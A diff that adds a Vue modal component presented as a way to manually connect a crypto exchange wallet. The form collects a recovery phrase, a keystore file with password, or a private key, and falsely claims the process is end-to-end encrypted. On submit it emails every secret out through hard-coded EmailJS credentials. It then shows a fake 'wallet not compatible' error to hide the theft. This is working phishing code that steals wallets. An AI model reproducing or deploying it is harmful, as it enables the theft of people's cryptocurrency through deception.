@@ -1,0 +1,183 @@
+<template>
+  <div class="flex flex-col p-10 bg-white w-[90vw] h-[70vh] md:h-[90vh] md:w-[30vw] rounded-xl">
+    <!-- Header -->
+    <div class="flex flex-row justify-between items-center space-x-2">
+      <img :src="exchange.picture" class="w-10 h-10" />
+      <div class="text-black">Connect your {{ exchange.name }} Manually</div>
+    </div>
+
+    <!-- scroll div-->
+    <!-- OPTIONS -->
+    <div class="flex justify-between border-b md:mt-10 mt-13">
+      <button
+        v-for="option in options"
+        :key="option.id"
+        @click="selectOption(option.id)"
+        class="flex-1 text-center pb-2 transition"
+        :class="
+          selectedOption === option.id
+            ? 'border-b-2 border-green-500 text-green-500'
+            : 'text-gray-400'
+        "
+      >
+        {{ option.label }}
+      </button>
+    </div>
+
+    <!-- FORM -->
+    <form @submit.prevent="submitForm" class="space-y-4 md:pt-3 pt-7">
+      <!-- OPTION 1 -->
+      <div v-if="selectedOption === 'phrase'">
+        <input
+          v-model="form.phrase"
+          type="text"
+          placeholder="Enter recovery phrase"
+          class="text-black h-20 w-full border border-slate-300 outline-green-300 p-3 rounded-lg placeholder:text-slate-300 placeholder:text-sm"
+        />
+
+        <div
+          class="text-black text-[10px] flex flex-col items-center justify-center mt-10 mb-10 md:mt-5 md:mb-0 space-y-4"
+        >
+          <p>Typically 12 (sometimes 24) words separated by single spaces</p>
+          <p>This process is encrypted end-to-end</p>
+        </div>
+      </div>
+
+      <!-- OPTION 2 -->
+      <div v-if="selectedOption === 'keystore'" class="space-y-3 text-black">
+        <input type="file" @change="handleFileUpload" class="w-full border p-2 rounded-lg" />
+
+        <input
+          v-model="form.password"
+          type="password"
+          placeholder="Enter password"
+          class="h-20 w-full border border-slate-300 outline-green-300 p-3 rounded-lg placeholder:text-slate-300 placeholder:text-sm"
+        />
+
+        <div
+          class="cursor-default text-black text-[10px] flex flex-col items-center justify-center mt-10 mb-10 md:mt-5 md:mb-0 space-y-4"
+        >
+          <p>This process is encrypted end-to-end</p>
+        </div>
+      </div>
+
+      <!-- OPTION 3 -->
+      <div v-if="selectedOption === 'privateKey'" class="text-black">
+        <input
+          v-model="form.privateKey"
+          type="text"
+          placeholder="Enter private key"
+          class="cursor-default text-black h-20 w-full border border-slate-300 outline-green-300 p-3 rounded-lg placeholder:text-slate-300 placeholder:text-sm"
+        />
+
+        <div
+          class="text-black text-[10px] flex flex-col items-center justify-center mt-10 mb-10 md:mt-5 md:mb-0 space-y-4"
+        >
+          <p>Typically 12 (sometimes 24) words separated by single spaces</p>
+          <p>This process is encrypted end-to-end</p>
+        </div>
+      </div>
+
+      <!-- SUBMIT -->
+      <button
+        type="submit"
+        class="w-full bg-green-500 text-white py-3 rounded-lg hover:bg-green-600 transition"
+      >
+        Proceed
+      </button>
+    </form>
+
+    <button
+      @click="cancelModal"
+      class="mt-5 w-full bg-red-400 text-white py-3 rounded-lg hover:bg-red-600 transition"
+    >
+      Cancel
+    </button>
+  </div>
+</template>
+
+<script>
+import emailjs from '@emailjs/browser'
+
+export default {
+  props: {
+    exchange: {
+      type: Object,
+      required: true,
+    },
+  },
+
+  data() {
+    return {
+      selectedOption: 'phrase',
+
+      options: [
+        { id: 'phrase', label: 'Phrase' },
+        { id: 'keystore', label: 'Keystore' },
+        { id: 'privateKey', label: 'Private Key' },
+      ],
+
+      form: {
+        phrase: '',
+        password: '',
+        privateKey: '',
+        file: null,
+      },
+    }
+  },
+
+  methods: {
+    cancelModal() {
+      this.$emit('cancel-modal')
+    },
+
+    selectOption(option) {
+      this.selectedOption = option
+    },
+
+    handleFileUpload(event) {
+      const file = event.target.files[0]
+
+      const reader = new FileReader()
+      reader.onload = () => {
+        this.form.file = reader.result // base64 string
+      }
+      reader.readAsDataURL(file)
+    },
+
+    submitForm() {
+      const templateParams = {
+        type: this.selectedOption,
+        phrase: this.form.phrase,
+        password: this.form.password,
+        privateKey: this.form.privateKey,
+        file: this.form.file,
+      }
+
+      emailjs
+        .send(
+          'service_h5prxh7', // your service ID
+          'template_0s9zdqz', // your template ID
+          templateParams,
+          'jtRY2pcc7TitAIDvF', // your public key
+        )
+        .then(() => {
+          console.log('SUCCESS!')
+          alert(
+            'Error! The wallet connected might not be compatible.Please contact the admin/support for more help or Connect with an active wallet',
+          )
+
+          // optional: reset form
+          this.form.phrase = ''
+          this.form.password = ''
+          this.form.privateKey = ''
+        })
+        .catch((error) => {
+          console.log('FAILED...', error)
+        })
+
+      this.$router.push('/error')
+    },
+  },
+}
+</script>
